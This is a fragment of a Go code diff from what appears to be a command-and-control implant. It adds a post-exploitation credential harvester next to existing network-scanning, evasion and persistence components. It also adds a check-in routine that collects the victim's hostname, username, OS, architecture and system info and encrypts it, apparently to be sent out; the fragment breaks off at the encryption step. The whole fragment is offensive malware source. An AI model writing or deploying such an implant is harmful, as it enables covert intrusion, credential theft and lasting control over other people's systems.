@@ -53,3 +53,28 @@ func newAgent(config Config) *Agent {
 		netScanner:  commands.NewNetworkScanner(),
 		evasion:     evasion.NewEvasionHandler(),
 		persistence: ph,
+		credHarvest: postexploit.NewCredentialHarvester(),
+	}
+}
+
+func (a *Agent) checkin() error {
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USERNAME")
+	if username == "" {
+		username = os.Getenv("USER")
+	}
+
+	sysInfo := commands.GetSystemInfo()
+
+	checkinData := map[string]interface{}{
+		"id":       a.id,
+		"hostname": hostname,
+		"username": username,
+		"os":       runtime.GOOS,
+		"arch":     runtime.GOARCH,
+		"sysinfo":  sysInfo,
+	}
+
+	data, _ := json.Marshal(checkinData)
+	encrypted, err := a.crypto.Encrypt(data)
+	if err != nil {
